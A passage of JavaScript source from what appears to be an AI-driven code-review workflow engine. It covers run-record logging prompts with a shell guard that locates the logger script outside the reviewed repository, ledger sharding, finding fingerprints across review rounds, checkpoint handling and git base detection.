  Object.entries(reviewerAgentFallbacks).filter(([id]) => !reviewerAgentUnavailable.some(x => x.id === id))
    .flatMap(([id, n]) => {
      const agent = reviewerAgentNames[id] || `${id} reviewer agent`
      const nf = reviewerAgentNotFound[id]
      return [
        { agent, count: n - (nf?.count || 0), what: 'lens dispatch(es)' },
        ...(nf ? [{ agent, count: nf.count, what: 'lens dispatch(es)', error: nf.error }] : []),
      ]
    }),
)

// Wraps every report the engine can return. Narrow on purpose: it fires only for a write that was
// ATTEMPTED and did not land, never for telemetry that was never attempted — a marker that shows up
// on healthy runs is a marker people stop reading, which is the symmetric half of the same defect.
/** @param {string} reportText */
function out(reportText) {
  return `${telemetryLostSection(telemetryLost)}${reReviewMemorySection()}${reviewerAgentSection()}${reportText}${optionalSection()}${surfaceGateSection()}${memorySection(memory)}${priorDecisionsRefusedSection(priorDecisionsIn.refused)}`
}

// ---- the one write path (shared with every other record-filing engine) ----
// The sandbox cannot import, so lib/run-logging.mjs reaches this script the same way run-record.mjs
// does: a fenced region regenerated and byte-compared by `node lib/check-workflows.mjs`.
// >>> craft-inline lib/run-logging.mjs LOGRUN_SCHEMA loggerPrelude payloadVersion engineRevisionFlag runDirFlags logRunPrompt logRunDispatch logRunOutcome quietly checkpointPrompt makeRunLogger telemetryLossNoter
const LOGRUN_SCHEMA = {
  type: 'object',
  additionalProperties: false,
  required: ['ok'],
  properties: {
    ok: { type: 'boolean', description: 'true only if the script ran and printed no craft-log-run FAILED line' },
    error: { type: 'string', description: 'when ok is false, the failing line verbatim; when ok is true AND the script printed a craft-log-run WARNING line, that line verbatim; empty otherwise' },
  },
}

/**
 * @param {string | undefined} craftRoot
 * @param {string} [version]
 * @param {string} [repo]
 */
function loggerPrelude(craftRoot, version = '', repo = '') {
  const preamble = `CRAFT_REPO="$(cd ${shq(repo || '.')} 2>/dev/null && pwd -P)" || CRAFT_REPO=""
craft_usable() {   # a line that is exactly '}' at column 0 would end the extracted region early
  case "$1" in /*) ;; *) return 1 ;; esac
  [ -f "$1" ] || return 1
  [ -n "$CRAFT_REPO" ] || return 1   # belt to the braces below; see the note in the comment above
  # A repo of "/" contains everything, so nothing can be outside it. The pattern below cannot say
  # that: "$CRAFT_REPO"/* becomes //* and matches no ordinary path, so every candidate reads as
  # outside and the guard inverts into an allow-all. Degenerate input, but the whole point of this
  # predicate is that it fails closed.
  [ "$CRAFT_REPO" = "/" ] && return 1
  CRAFT_REAL="$1"
  CRAFT_HOPS=0
  while [ -L "$CRAFT_REAL" ]; do
    [ "$CRAFT_HOPS" -lt 16 ] || return 1
    CRAFT_LINK="$(readlink "$CRAFT_REAL")"
    case "$CRAFT_LINK" in
      /*) CRAFT_REAL="$CRAFT_LINK" ;;
      *) CRAFT_REAL="$(dirname "$CRAFT_REAL")/$CRAFT_LINK" ;;
    esac
    CRAFT_HOPS=$((CRAFT_HOPS + 1))
  done
  CRAFT_DIR="$(cd "$(dirname "$CRAFT_REAL")" 2>/dev/null && pwd -P)" || return 1
  [ -n "$CRAFT_DIR" ] || return 1
  CRAFT_REAL="$CRAFT_DIR/$(basename "$CRAFT_REAL")"
  case "$CRAFT_REAL" in
    "$CRAFT_REPO"/*|"$CRAFT_REPO") return 1 ;;
  esac
  return 0
 }
CRAFT_LOGGER=""
`
  /** @param {string} expr */
  const tryCandidate = expr => `if [ -z "\${CRAFT_LOGGER:-}" ]; then
  CRAFT_TRY=${expr}
  craft_usable "$CRAFT_TRY" && CRAFT_LOGGER="$CRAFT_REAL"
fi
`
  const explicit = craftRoot ? tryCandidate(`${shq(craftRoot)}"/lib/craft-log-run.mjs"`) : ''
  const fromEnv = tryCandidate('"${CLAUDE_PLUGIN_ROOT:-}/lib/craft-log-run.mjs"')
  const installed = version
    ? tryCandidate(`"\${CLAUDE_CONFIG_DIR:-$HOME/.claude}/plugins/cache/craft/craft/"${shq(version)}"/lib/craft-log-run.mjs"`)
    : ''
  return `${preamble}${explicit}${fromEnv}${installed}[ -n "\${CRAFT_LOGGER:-}" ] || { echo "craft-log-run FAILED: no usable logger — no absolute craftRoot outside the reviewed repo, no CLAUDE_PLUGIN_ROOT, and no installed copy of "${version ? shq(version) : "'this version'"}" under the plugin cache; refusing to resolve against the reviewed repository"; exit 1; }
`
}

/** @param {unknown} payload @returns {string} */
function payloadVersion(payload) {
  return String((payload && typeof payload === 'object' ? /** @type {{ craftVersion?: unknown }} */ (payload).craftVersion : undefined) ?? '')
}

/** @param {unknown} payload @returns {string} */
function engineRevisionFlag(payload) {
  const rev = payload && typeof payload === 'object' ? /** @type {{ workflowEngineRevision?: unknown }} */ (payload).workflowEngineRevision : undefined
  return Number.isInteger(rev) ? `--engine-revision ${rev} ` : ''
}

/** @param {string} dir @param {boolean} rejoin @returns {string} */
function runDirFlags(dir, rejoin) {
  return `${dir ? `--dir ${shq(dir)} ` : ''}${rejoin ? '--rejoin ' : ''}\${CLAUDE_CODE_SESSION_ID:+--session "$CLAUDE_CODE_SESSION_ID"} `
}

/** @param {{ record?: unknown, craftRoot?: string, repo?: string, command?: string, dir?: string, rejoin?: boolean }} [opts] */
function logRunPrompt({ record, craftRoot = '', repo = '', command = 'write', dir = '', rejoin = false } = {}) {
  const version = payloadVersion(record)
  const flags = runDirFlags(dir, rejoin)
  return `You are the craft observability logger. Persist ONE run record. This is mechanical IO — do not analyze, summarise, reformat or "clean up" any part of it.

Run exactly this:

\`\`\`
${loggerPrelude(craftRoot, version, repo)}CRAFT_REC="$(mktemp "\${TMPDIR:-/tmp}/craft-rec.XXXXXX")"
cat > "$CRAFT_REC" <<'CRAFT_RECORD_EOF'
…RECORD below, byte for byte…
CRAFT_RECORD_EOF
cd ${shq(repo || '.')} && node "$CRAFT_LOGGER" ${command} ${engineRevisionFlag(record)}${flags}--project "$PWD" < "$CRAFT_REC"; CRAFT_RC=$?; rm -f "$CRAFT_REC"; exit $CRAFT_RC
\`\`\`

The script computes every field (ts, project, commit, dirty, engineRevision, craftCommit, and — reading the working copy with git — branch and head, whose values in the record below are only a fallback for what git cannot resolve), names the file, appends the index line and verifies the readback. You compute NONE of that. In particular: do NOT \`mkdir\` the store, do NOT run \`date\`, \`pwd\` or \`git\` yourself, and do NOT append to index.jsonl by hand.

COPY THE RECORD VERBATIM into the quoted heredoc — it can be hundreds of KB (findings, ledger, dimensions), and re-emitting it from memory silently drops the big arrays. That is exactly how a completed review once persisted \`findings: 111\` with \`dimensions: []\` and no \`verification\`, destroying the per-lens telemetry the whole store exists for.

If the script prints a line starting \`craft-log-run FAILED\`, or the command itself fails (for example the logger path does not exist), return {"ok": false, "error": "<that line, or the shell error, verbatim>"} and stop — do NOT fall back to writing the file by hand. If it succeeded, return {"ok": true} — and if it ALSO printed a line starting \`craft-log-run WARNING\`, return {"ok": true, "error": "<that line verbatim>"}: the record landed, but something about the run directory did not, and the engine has to be able to say so. Best-effort either way: never error the run over this.

RECORD:
${JSON.stringify(record, null, 2)}`
}

/**
 * @param {unknown} record
 * @param {{ phase?: string }} [opts]
 * @returns {{ label: string, phase: string, schema: typeof LOGRUN_SCHEMA, model: 'sonnet' | 'haiku', effort: 'low' }}
 */
function logRunDispatch(record, { phase = '' } = {}) {
  const payloadKB = JSON.stringify(record).length / 1024
  const big = payloadKB > 24
  return {
    label: `log-run${big ? ` (${Math.round(payloadKB)}KB)` : ''}`,
    phase,
    schema: LOGRUN_SCHEMA,
    model: big ? 'sonnet' : 'haiku',
    effort: 'low',
  }
}

/**
 * @param {unknown} res harness result of the logger agent (model output), or a quiet call's `{ __threw }`
 * @returns {{ ok: boolean, reason: string }}
 */
function logRunOutcome(res) {
  const r = res && typeof res === 'object' ? /** @type {{ ok?: unknown, error?: unknown, __threw?: unknown }} */ (res) : null
  if (r && r.ok === true) return { ok: true, reason: String((r.error || '')).trim() }
  return { ok: false, reason: String((r && (r.__threw || r.error)) || 'the logger agent returned no result') }
}

/**
 * @template P, O, R
 * @param {(prompt: P, opts: O) => Promise<R>} call a harness agent callback
 * @returns {(prompt: P, opts: O) => Promise<R | { __threw: string }>}
 */
function quietly(call) {
  return async (prompt, opts) => {
    try {
      return await call(prompt, opts)
    } catch (e) {
      return { __threw: String((e && /** @type {{ message?: unknown }} */ (e).message) || e) }
    }
  }
}

/** @param {{ payload?: unknown, craftRoot?: string, repo?: string, phase?: string, dir?: string, rejoin?: boolean }} [opts] */
function checkpointPrompt({ payload, craftRoot = '', repo = '', phase = '', dir = '', rejoin = false } = {}) {
  const version = payloadVersion(payload)
  const flags = `--phase ${shq(phase)} ${engineRevisionFlag(payload)}${runDirFlags(dir, rejoin)}`
  return `You are the craft observability logger writing ONE phase checkpoint. Mechanical IO — do not analyze.

Run exactly this, then return the runDir the script prints:

\`\`\`
${loggerPrelude(craftRoot, version, repo)}CRAFT_REC="$(mktemp "\${TMPDIR:-/tmp}/craft-ckpt.XXXXXX")"
cat > "$CRAFT_REC" <<'CRAFT_RECORD_EOF'
…PAYLOAD below, byte for byte…
CRAFT_RECORD_EOF
cd ${shq(repo || '.')} && node "$CRAFT_LOGGER" checkpoint ${flags}--project "$PWD" < "$CRAFT_REC"; CRAFT_RC=$?; rm -f "$CRAFT_REC"; exit $CRAFT_RC
\`\`\`

The script owns naming, sequencing and every computed field. Copy PAYLOAD verbatim into the quoted heredoc. Best-effort: if it fails, report the error line and do NOT retry by writing files yourself.

PAYLOAD:
${JSON.stringify(payload, null, 2)}`
}

/**
 * @template O
 * @param {object} o
 * @param {(prompt: string, opts: ReturnType<typeof logRunDispatch>) => Promise<O>} o.call  a `quietly`-wrapped agent callback
 * @param {string} o.phase
 * @param {() => { craftRoot?: string, repo?: string, command?: string, dir?: string, rejoin?: boolean }} o.target
 * @param {(what: string, why: string, landed: boolean) => void} o.noteLoss
 * @param {(record: Record<string, unknown>) => Record<string, unknown>} [o.prepare]
 * @returns {(record: Record<string, unknown>) => Promise<void>}
 */
function makeRunLogger({ call, phase, target, noteLoss, prepare = record => record }) {
  return async recordIn => {
    const record = prepare(recordIn)
    const landed = logRunOutcome(await call(logRunPrompt({ ...target(), record }), logRunDispatch(record, { phase })))
    if (!landed.ok) noteLoss('the run record', landed.reason, false)
    else if (landed.reason) noteLoss('the run directory (the record itself landed)', landed.reason, true)
  }
}

/**
 * @param {string[]} lost
 * @param {(line: string) => void} say
 * @returns {(what: string, why: string, landed: boolean) => void}
 */
function telemetryLossNoter(lost, say) {
  return (what, why, landed) => {
    lost.push(`${what} — ${why}`)
    say(landed ? `⚠️ telemetry: ${why}` : `⚠️ telemetry lost: ${what} — ${why}`)
  }
}
// <<< craft-inline

// The ledger's own survival path. Same reason as the region above: the sandbox cannot import, so the
// shard cutter is fenced in from lib/ledger-shards.mjs, where it is linted and unit-tested.
// >>> craft-inline lib/ledger-shards.mjs LEDGER_SHARD_MAX_BYTES LEDGER_SHARD_PHASE LEDGER_SHARD_MAX_SHARDS LEDGER_COPY_REFUSAL_ENTRIES LEDGER_COPY_SAFETY_ROWS LEDGER_TOMBSTONE_MAX payloadBytes shardLedger packLedgerGroups tombstoneRound pruneTombstones newestTombstonePerFp tombstoneBudget
const LEDGER_SHARD_MAX_BYTES = 14336

const LEDGER_SHARD_PHASE = 'ledger'

const LEDGER_SHARD_MAX_SHARDS = 20

const LEDGER_COPY_REFUSAL_ENTRIES = 170

const LEDGER_COPY_SAFETY_ROWS = 20

const LEDGER_TOMBSTONE_MAX = LEDGER_COPY_REFUSAL_ENTRIES - LEDGER_COPY_SAFETY_ROWS

/**
 * @param {unknown} item
 * @returns {number}
 */
function payloadBytes(item) {
  const pretty = JSON.stringify(item, null, 2)
  if (typeof pretty !== 'string') return 2
  return pretty.length + pretty.split('\n').length * 4 + 2
}

/**
 * @param {unknown} ledger
 * @param {{ max?: number, maxShards?: number }} [opts]
 * @returns {{ ledgerShard: { index: number, of: number, total: number }, ledgerItems: unknown[] }[]}
 */
function shardLedger(ledger, { max = LEDGER_SHARD_MAX_BYTES, maxShards = LEDGER_SHARD_MAX_SHARDS } = {}) {
  const items = Array.isArray(ledger) ? ledger : []
  if (!items.length) return []
  const groups = packLedgerGroups(items, max, maxShards)
  return groups.map((group, i) => ({
    ledgerShard: {
      index: i + 1,
      of: groups.length,
      total: items.length,
    },
    ledgerItems: group,
  }))
}

/**
 * @param {unknown[]} items
 * @param {number} max
 * @param {number} maxShards
 * @returns {unknown[][]}
 */
function packLedgerGroups(items, max, maxShards) {
  /** @type {unknown[][]} */
  const groups = []
  let bytes = 0
  for (const item of items) {
    const size = payloadBytes(item)
    if (!groups.length || (/** @type {unknown[]} */ (groups[groups.length - 1]).length && bytes + size > max)) {
      if (groups.length >= maxShards) break          // the overflow is declared below, not hidden
      groups.push([])
      bytes = 0
    }
    /** @type {unknown[]} */ (groups[groups.length - 1]).push(item)
    bytes += size
  }
  return groups
}

/**
 * @typedef {{ fp?: unknown, why?: unknown, round?: unknown }} Tombstone
 */
/**
 * @param {Tombstone | null | undefined} t
 * @returns {number}
 */
function tombstoneRound(t) {
  const m = /round (\d+)/.exec(String((t && t.why) || ''))
  if (m) return Number(m[1])
  const r = Number(t && t.round)
  return Number.isFinite(r) ? r : 0
}

/**
 * @param {unknown} tombstones
 * @param {{ max?: number }} [opts]
 * @returns {Tombstone[]}
 */
function pruneTombstones(tombstones, { max = LEDGER_TOMBSTONE_MAX } = {}) {
  /** @type {Tombstone[]} */
  const items = Array.isArray(tombstones) ? tombstones : []
  const deduped = newestTombstonePerFp(items)
  if (deduped.length <= max) return deduped
  return deduped
    .map(row => ({ row, r: tombstoneRound(row) }))
    .sort((a, b) => b.r - a.r)
    .slice(0, max)
    .map(d => d.row)
}

/** @param {Tombstone[]} items @returns {Tombstone[]} */
function newestTombstonePerFp(items) {
  /** @type {Map<unknown, Tombstone>} */
  const newestByFp = new Map()
  /** @type {Tombstone[]} */
  const noFp = []
  for (const t of items) {
    if (!t || typeof t !== 'object') continue
    if (!t.fp) { noFp.push(t); continue }
    const prev = newestByFp.get(t.fp)
    if (!prev || tombstoneRound(t) >= tombstoneRound(prev)) newestByFp.set(t.fp, t)
  }
  return [...newestByFp.values(), ...noFp]
}

/**
 * @param {unknown} liveCount
 * @param {{ ceiling?: number }} [opts]
 * @returns {number}
 */
function tombstoneBudget(liveCount, { ceiling = LEDGER_TOMBSTONE_MAX } = {}) {
  const live = Math.max(0, Number(liveCount) || 0)
  return Math.max(0, ceiling - live)
}
// <<< craft-inline

/** @type {Schema<CheckpointAnswer>} */
const CHECKPOINT_SCHEMA = {
  type: 'object',
  additionalProperties: false,
  required: ['runDir'],
  properties: {
    runDir: { type: 'string', description: 'the runDir the script printed; empty string if it failed' },
    error: { type: 'string', description: 'when runDir is empty, the failing line verbatim; when the script printed a craft-log-run WARNING line, that line verbatim; empty otherwise' },
  },
}
let runDir = ''
let checkpointFailed = false
let rejoinArmed = false
// ARMED, not merely "something failed". `checkpointFailed` says a checkpoint died; this says the run
// went on to ASK the logger to rejoin — `!runDir && checkpointFailed`, the only state in which a
// directory can be adopted. Finalize used the coarser flag, so a run whose first checkpoint minted
// its directory and whose third died declared an adoption that never happened: the CLI then dropped
// the `ownDir` shortcut, read a mid-review branch move as "not this run's directory", and left the
// run's own phases unfolded. Sticky, because an adoption is not undone by later checkpoints
// succeeding — once a directory MIGHT be someone else's, it stays might-be for the finalize proof.
/** @param {string} phase @param {Record<string, unknown>} payloadIn @param {string} group */
async function checkpoint(phase, payloadIn, group) {
  // kind/name are what the checkpoint DIRECTORY is named after, and `recover` parses them back out of
  // that name to rebuild a dead run's identity. A payload without them produced a real
  // `…Z-unknown-unknown` directory on the first live run — recoverable, but recovered as a run of
  // nothing. They belong on every slice, not just the final record.
  // craftVersion rides on every slice: it is what the checkpoint's own logger lookup derives its
  // version from, and a slice that cannot say which build wrote it is a slice `recover` cannot place.
  // workflowEngineRevision: THIS engine's revision, the side that computes the fingerprints — what a
  // later round decides their basis by (realm @nick/craft #111). Last, so no payload key shadows it.
  const payload = { kind: 'workflow', name: 'review', craftVersion: CRAFT_VERSION, ...payloadIn, workflowEngineRevision: ENGINE_REVISION }
  // ragent does NOT catch a budget-exceeded throw (see its comment), and agent() throws for harness
  // reasons too — so a rejection, not just a null, is a real outcome here. It has to land in the same
  // place as every other failed write: the report. Letting it propagate would abort the whole review
  // over a bookkeeping write, which is exactly what this whole path exists to prevent.
  const asked = runDir
  const armRejoin = !runDir && checkpointFailed
  if (armRejoin) rejoinArmed = true
  const { answer: res, threw } = splitThrew(await ragentQuietly(
    checkpointPrompt({ payload, craftRoot: craftRootArg, repo: repoArg, phase, dir: runDir, rejoin: armRejoin }),
    { label: `checkpoint:${phase}`, phase: group, schema: CHECKPOINT_SCHEMA, model: 'haiku', effort: 'low' },
  ))
  if (res?.runDir) {
    // A refused `--dir` does not fail the checkpoint: the script MINTS a fresh directory, prints a
    // WARNING on stderr and returns a perfectly valid runDir on stdout. Taking it silently strands
    // every slice written into the directory we asked for — finalize folds only the new one, its
    // `kept` warning cannot fire (the old directory was never its target), and the report calls the
    // run clean. The engine can see this without trusting the model to relay stderr: we know which
    // directory we asked for, so a different one coming back IS the refusal.
    if (asked && res.runDir !== asked) {
      noteTelemetryLoss(`phase checkpoint '${phase}'`, `the logger minted ${res.runDir} instead of the run's own ${asked} — earlier phase slices there will not be folded`)
    }
    runDir = res.runDir
  } else {
    // Remember it: with no runDir to thread, every later checkpoint would mint a directory of its
    // own and this run would fragment into orphan partials that `recover` promotes as unrelated
    // half-runs. `--rejoin` lets the script re-enter the directory this run already has. It is opt-in
    // for a reason — asking for it unconditionally would make a SECOND, concurrent review adopt this
    // one's directory, and concurrent reviews on one machine are ordinary.
    checkpointFailed = true
    noteTelemetryLoss(`phase checkpoint '${phase}'`, threw || res?.error || 'the logger agent returned no runDir')
  }
}

// Persisting the record is deterministic work, and it is now done by lib/craft-log-run.mjs. The model
// is left in the loop only because the sandbox cannot reach a filesystem at all — its entire job is a
// quoted heredoc into the script. It no longer computes ts/project/commit/dirty, chooses the filename,
// hand-appends the index or hand-verifies the readback; that recipe is what once persisted a completed
// review as `dimensions: [], verification: null`. Fewer decisions in the prompt is the whole fix.
// The write itself is the one every engine binds (lib/run-logging.mjs, makeRunLogger); what is
// review's own is bound here.
const logRun = makeRunLogger({
  // ragent underneath `quietly`, so the retry-once behaviour still applies to the record write.
  call: ragentQuietly,
  phase: 'Synthesize',
  // `finalize`, not `write`: this is the one engine that checkpoints, so the script folds this run's
  // phase slices into the record it writes. Read at each call — `runDir` and `rejoinArmed` move as
  // the checkpoints run.
  target: () => ({ craftRoot: craftRootArg, repo: repoArg, command: 'finalize', dir: runDir, rejoin: rejoinArmed }),
  // Every review record — the early exits too, not only reviewRecord() — says which engine computed its
  // fingerprints: a later round decides their basis by this (realm @nick/craft #111). Last, so no
  // caller's field shadows it.
  prepare: recordIn => ({ ...recordIn, workflowEngineRevision: ENGINE_REVISION }),
  // Into the same telemetryLost list the checkpoints and the prior-round read note into, but through
  // the shared note: a record that landed with its run directory refused is logged as landed, never
  // as lost (realm @nick/craft #39). makeRunLogger always hands it a non-empty reason, so the line kept
  // for the report is the one noteTelemetryLoss would keep.
  noteLoss: telemetryLossNoter(telemetryLost, log),
})

/** @param {Finding} f */
function key(f) {
  return `${(f['file'] || '').toLowerCase()}:${f['line'] || 0}:${(f['title'] || '').toLowerCase().replace(/\s+/g, ' ').trim()}`
}

// >>> craft-inline lib/run-record.mjs titleShingle normalizeSymbol fingerprint shingleOverlap matchesPrior rereviewVerdict reReviewMemory branchFromAbbrevRef ENGINE_REVISION FP_BASIS_SINCE fpBasisOf fpBasisEstablished sameFpBasis basisVerdictFromRevisions
/**
 * @param {unknown} title
 * @returns {string}
 */
function titleShingle(title) {
  return String(title || '')
    .toLowerCase()
    .replace(/[^a-z0-9]+/g, ' ')
    .trim()
    .split(/\s+/)
    .filter(Boolean)
    .sort()
    .join(' ')
}

/**
 * @param {unknown} symbol
 * @returns {string}
 */
function normalizeSymbol(symbol) {
  let s = String(symbol || '').toLowerCase().replace(/\b(?:fn|impl)\s+/g, '')
  let prev
  do { prev = s; s = s.replace(/<[^<>]*>/g, '') } while (s !== prev)
  return s.trim()
}

/**
 * @param {FindingKey | null | undefined} f
 * @returns {string}
 */
function fingerprint(f) {
  /** @type {FindingKey} */
  const k = f || {}
  const ruleId = k.ruleId || ''
  const basis = ruleId
    ? [k.file || '', normalizeSymbol(k.symbol), ruleId].join('\0')
    : [k.file || '', normalizeSymbol(k.symbol), '', titleShingle(k.title)].join('\0')
  let h = 5381
  for (let i = 0; i < basis.length; i++) h = ((h << 5) + h + basis.charCodeAt(i)) >>> 0
  return h.toString(16).padStart(8, '0')
}

/**
 * @param {unknown} a
 * @param {unknown} b
 * @returns {number}
 */
function shingleOverlap(a, b) {
  const sa = new Set(titleShingle(a).split(' ').filter(Boolean))
  const sb = new Set(titleShingle(b).split(' ').filter(Boolean))
  if (!sa.size || !sb.size) return 0
  let inter = 0
  for (const w of sa) if (sb.has(w)) inter++
  return inter / Math.max(sa.size, sb.size)
}

/**
 * @param {FindingKey | null | undefined} cur
 * @param {FindingKey | null | undefined} prior
 * @param {{ threshold?: number }} [options]
 * @returns {boolean}
 */
function matchesPrior(cur, prior, { threshold = 0.6 } = {}) {
  /** @type {(n: 'file' | 'ruleId' | 'symbol') => [unknown, unknown]} */
  const field = n => [cur?.[n] || '', prior?.[n] || '']
  const [curFile, priorFile] = field('file')
  if (curFile !== priorFile) return false
  const [curRule, priorRule] = field('ruleId')
  if (curRule !== priorRule) return false
  const [curSymbol, priorSymbol] = field('symbol')
  if (curSymbol && priorSymbol && curSymbol !== priorSymbol) return false
  return shingleOverlap(cur?.title, prior?.title) >= threshold
}

/**
 * @param {{ stillOpen?: unknown[], regressed?: unknown[], neu?: unknown[] }} [findings]
 * @returns {string}
 */
function rereviewVerdict({ stillOpen = [], regressed = [], neu = [] } = {}) {
  return reviewVerdict([...stillOpen, ...regressed, ...neu])
}

/**
 * @param {string | null | undefined} priorReason
 * @returns {{ chained: boolean, reason: string | null, note: string | null }}
 */
function reReviewMemory(priorReason) {
  const reason = priorReason || null
  const chained = !reason
  const note = reason === 'no-branch'
    ? 'Re-review memory is OFF: this run has no branch to chain review rounds on (usually a detached HEAD). Findings will not carry forward across runs. Check out a branch and re-review on it to enable round-to-round memory.'
    : null
  return { chained, reason, note }
}

/**
 * @param {string} ref
 * @returns {string}
 */
function branchFromAbbrevRef(ref) {
  return ref === 'HEAD' ? '' : ref
}

const ENGINE_REVISION = 4

const FP_BASIS_SINCE = [1, 3]

/**
 * @param {unknown} rev
 * @returns {number | null}
 */
function fpBasisOf(rev) {
  if (!Number.isInteger(rev) || /** @type {number} */ (rev) < 1) return null
  return Math.max(...FP_BASIS_SINCE.filter(b => b <= /** @type {number} */ (rev)))
}

/**
 * @param {unknown} priorRev
 * @param {number} [currentRev]
 * @returns {boolean}
 */
function fpBasisEstablished(priorRev, currentRev = ENGINE_REVISION) {
  return Number.isInteger(priorRev) && /** @type {number} */ (priorRev) >= 1 && /** @type {number} */ (priorRev) <= currentRev
}

/**
 * @param {unknown} priorRev
 * @param {number} [currentRev]
 * @returns {boolean}
 */
function sameFpBasis(priorRev, currentRev = ENGINE_REVISION) {
  if (Number.isInteger(priorRev) && /** @type {number} */ (priorRev) > currentRev) return false
  const prior = fpBasisOf(priorRev)
  return prior !== null && prior === fpBasisOf(currentRev)
}

/**
 * @param {unknown} revs
 * @param {number} [currentRev]
 * @returns {{ sameFpBasis: boolean, fpBasisKnown: boolean }}
 */
function basisVerdictFromRevisions(revs, currentRev = ENGINE_REVISION) {
  const list = Array.isArray(revs) ? revs : []
  if (!list.length || !list.every(r => fpBasisEstablished(r, currentRev))) return { sameFpBasis: false, fpBasisKnown: false }
  const bases = new Set(list.map(fpBasisOf))
  if (bases.size !== 1) return { sameFpBasis: false, fpBasisKnown: false }
  return { sameFpBasis: fpBasisOf(list[0]) === fpBasisOf(currentRev), fpBasisKnown: true }
}
// <<< craft-inline
// A re-review scans lenses only over the fix delta (prevHead...HEAD) by default — cheap, but a defect
// in code an intermediate round did not touch is never re-scanned; only the carried ledger keeps it
// alive. Two pure guards close the resulting coverage holes (see the runtime use sites):
//   ledgerDegraded — the prior round reported findings but persisted NO ledger (an older craft run, or
//     one that failed to write one). The adjudicate track then has nothing to carry and the re-review
//     silently degrades to a near-first-pass. Detect it to warn AND force a full re-scan.
//   shouldFullRescan — every `fullEvery`-th re-review (and always when the ledger is degraded, or on a
//     first review) re-scans the FULL base...HEAD diff so an earlier miss in untouched code resurfaces.
//     fullEvery<=0 disables the periodic full scan (pure incremental).
//   ledgerTruncated — the ledger crosses an agent boundary as structured output. The loader script
//     prints an authoritative `ledgerCount` beside it; if the array that arrived is a different
//     length, entries were lost in transport and an 82-entry round would otherwise be carried as a
//     genuine 20-entry one. Degraded → full re-scan, same as a missing ledger.
/** @param {PriorRound | null} priorRound */
function ledgerTruncated(priorRound) {
  if (!priorRound) return false
  const count = Number(priorRound['ledgerCount'])
  if (!Number.isFinite(count)) return false   // a record from before the count existed: nothing to check
  return count !== (Array.isArray(priorRound['ledger']) ? priorRound['ledger'].length : 0)
}
/** @param {PriorRound | null} priorRound */
function ledgerDegraded(priorRound) {
  if (!priorRound) return false
  if (ledgerTruncated(priorRound)) return true
  const findings = Number(priorRound['priorFindings'] || 0)
  const ledgerLen = Array.isArray(priorRound['ledger']) ? priorRound['ledger'].length : 0
  return findings > 0 && ledgerLen === 0
}
/** @param {{ priorRound: PriorRound | null, thisRound: number, fullEvery: number, degraded: boolean, journalSourced: boolean }} args */
function shouldFullRescan({ priorRound, thisRound, fullEvery, degraded, journalSourced }) {
  if (!priorRound) return true            // a first review is already a full base...HEAD scan
  if (degraded) return true               // nothing to carry — a delta-only scan would review almost nothing
  // Kept as its own condition rather than folded into `degraded`: the two are genuinely different
  // failures. `degraded` means the carried ledger is untrustworthy or missing; a journal-sourced
  // round's ledger is fine — the problem is its `head`, which is the commit the DEAD run stalled on.
  // The operator's natural move after a stall is to re-run on that SAME commit before making any
  // fix, so `priorRound.head` can equal the caller's current HEAD; a delta scan of head...HEAD would
  // then be empty rather than incremental, silently trading a full review for a blind one.
  if (journalSourced) return true
  const n = Number(fullEvery)
  if (!Number.isFinite(n) || n < 1) return false
  return Number(thisRound) % n === 0
}

// A finding is "tool-sourced" — deterministic and re-runnable, so a verifier may refute it ONLY by
// re-running the tool — when it came from neither a review lens nor the negative-space lens nor
// dep-context. dep-context is a *reasoning* seed from the gate (version-specific API misuse) with no
// re-runnable tool behind it, so it must be verifiable by argument like a lens finding; classifying
// it as a tool would make it effectively unfalsifiable ("keep an unverifiable tool finding alive")
// and inflate the verdict with false Warnings.
/** @param {Profile} profile @param {string | undefined} source */
function isToolSource(profile, source) {
  return !((source !== undefined && profile.lenses.includes(source)) || source === 'negative-space' || source === 'dep-context')
}

// ================= Detect base + languages =================
phase('Scout')
// An absolute `path` with no `repo` to decide it against: refuse BEFORE the first agent is
// dispatched. Zero cost, and the caller is told the two spellings that are unambiguous — against a
// run that guesses, which costs a full fan-out and then reports a scope nobody asked for.
async function ambiguousPathExit() {
  const msg = `path=${ambiguousPath} is an absolute path and no \`repo\` was given, so it is ambiguous: it could name the REPOSITORY to review (pass it as \`repo\`) or a directory INSIDE the repository to narrow to (pass it relative to the repo root). Nothing ran — re-dispatch with one of those two spellings.`
  await logRun({
    schemaVersion: 1, runtime: 'claude-code', craftVersion: CRAFT_VERSION, kind: 'workflow', name: 'review', nested: !!viaArg, via: viaArg || null,
    languages: [], verdict: 'INCOMPLETE (ambiguous path)', findings: summarizeFindings([]), dimensions: [], verification: null,
    // The CLASS, not this run's path — `notRun` is ranked by exact string (see `scopeNotRun`).
    // The path itself is in the verdict prose below, where nothing ranks it.
    uncoveredFiles: [], notRun: ['an absolute `path` with no `repo` — ambiguous scope, nothing ran'], outputTokens: budget.spent(),
  })
  return out([`## Verdict`, `⚠️ INCOMPLETE — ${msg}`].join('\n'))
}
async function detectDiedExit() {
  await logRun({
    schemaVersion: 1, runtime: 'claude-code', craftVersion: CRAFT_VERSION, kind: 'workflow', name: 'review', nested: !!viaArg, via: viaArg || null,
    languages: [], verdict: 'INCOMPLETE (detect died)', findings: summarizeFindings([]), dimensions: [], verification: null, notRun: ['base/changed-files detection', ...scopeNotRun], outputTokens: budget.spent(),
  })
  return out([`## Verdict`, `⚠️ INCOMPLETE — the base-resolution agent died twice (API error); nothing was reviewed. Re-run the review.`].join('\n') + scopeSection())
}
/** @returns {Promise<{ exit: string, detected: null } | { exit: null, detected: DetectAnswer }>} */
async function detectChanges() {
  if (ambiguousPath) return { exit: await ambiguousPathExit(), detected: null }
  const detected = await ragent(
    `You are resolving the review base and the changed files. Use shell + read only — do NOT review.${pathArg ? `\n\nSCOPE: consider ONLY files under ${shq(pathArg)}; pass \`-- ${shq(pathArg)}\` to the git commands below.` : ''}
1. Resolve the diff base. ${baseArg
    ? `Use \`${baseArg}\`.`
    : 'Try in order until one resolves: `git merge-base HEAD origin/main`, `git merge-base HEAD main`, `HEAD~1`. If the tree has uncommitted changes, target those.'}
2. List the changed file paths: \`git diff --name-only <base>...HEAD\`${pathArg ? ` -- ${shq(pathArg)}` : ''} (and include uncommitted changes from \`git status --porcelain\` if the tree is dirty).
3. Capture the VERBATIM change description as \`spec\` — the authors' own written claims/invariants, checked against code later. If the current branch has an OPEN PR, run \`gh pr view --json body,title\` and use its title + body. Otherwise use the commit messages on the diff range: \`git log <base>..HEAD --format=%B\`. Do not summarize or paraphrase — copy the text as-is. Truncate to ~4000 chars. Empty string if there is no PR and no commit body (e.g. only uncommitted changes). If \`gh\` is missing/unauthenticated, fall through to the commit messages.
